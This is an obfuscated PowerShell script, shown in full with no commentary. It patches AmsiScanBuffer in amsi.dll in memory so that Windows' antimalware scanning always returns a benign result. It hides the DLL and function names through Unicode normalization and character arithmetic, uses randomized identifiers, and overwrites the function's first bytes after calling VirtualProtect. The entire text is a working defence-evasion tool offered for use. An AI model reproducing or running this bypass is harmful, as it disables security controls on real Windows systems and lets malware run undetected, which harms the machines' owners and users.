$K_BIcb9KY8X84mdwz8Y = @"
using System;
using System.Runtime.InteropServices;
public class K_BIcb9KY8X84mdwz8Y {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr vx0vvpLdxHN3w, string T7_GkQ2dYMAtulwOz);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr e5eJoGKs, UIntPtr lzs68O3LZNyEjtf, uint J3ccg, out uint T5BzB3Bf1o2Y);
}
"@

Add-Type $K_BIcb9KY8X84mdwz8Y

$wmB = [K_BIcb9KY8X84mdwz8Y]::LoadLibrary("$(('á'+'m'+'s'+'î'+'.'+'d'+'l'+'l').NoRmALiZE([cHaR]([byTE]0x46)+[ChaR](111*7/7)+[CHaR](114*17/17)+[chAR]([ByTE]0x6d)+[cHar](41+27)) -replace [ChAR](92+5-5)+[chaR](112+16-16)+[CHAR](123)+[ChaR](77*74/74)+[chaR](110*59/59)+[CHaR]([BYTe]0x7d))")
$SCI = [K_BIcb9KY8X84mdwz8Y]::GetProcAddress($wmB, "$(('Ãms'+'îSc'+'ànB'+'ùff'+'êr').NoRmalIZE([CHar]([bytE]0x46)+[chAr](111*21/21)+[CHAR]([byTE]0x72)+[ChAr]([bYTe]0x6d)+[CHar]([ByTE]0x44)) -replace [cHAR]([byTe]0x5c)+[chaR](51+61)+[cHAr]([BYTe]0x7b)+[char]([bytE]0x4d)+[chaR](54+56)+[char](125+80-80))")
$p = 0
[K_BIcb9KY8X84mdwz8Y]::VirtualProtect($SCI, [uint32]5, 0x40, [ref]$p)
$IM3Ytsp = "0xB8"
$iwMgjjQrW1oIxj = "0x57"
$KqNjz2U5QHoQh3LVjrl4 = "0x00"
$CzfIybu0 = "0x07"
$HXVOpu4d = "0x80"
$Bf6Iu_K5ltusd = "0xC3"
$fVJfkYhtDs20r = [Byte[]] ($IM3Ytsp,$iwMgjjQrW1oIxj,$KqNjz2U5QHoQh3LVjrl4,$CzfIybu0,+$HXVOpu4d,+$Bf6Iu_K5ltusd)
[System.Runtime.InteropServices.Marshal]::Copy($fVJfkYhtDs20r, 0, $SCI, 6)